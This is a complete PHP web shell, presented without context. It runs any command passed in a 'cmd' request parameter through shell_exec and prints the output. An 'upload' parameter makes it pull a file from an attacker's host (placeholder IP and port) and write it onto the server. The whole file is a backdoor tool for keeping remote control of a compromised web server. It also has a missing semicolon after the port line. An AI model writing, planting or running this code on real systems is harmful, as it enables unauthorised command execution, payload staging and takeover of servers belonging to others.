<?php
	$host = "my_ip";
	$port = "my_port"
	if (isset($_REQUEST['upload'])) {
		file_put_contents($_REQUEST['upload'], file_get_contents("http://$host:$port/" . $_REQUEST['upload']));
	};
	if (isset($_REQUEST['cmd'])) {
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	};
?>
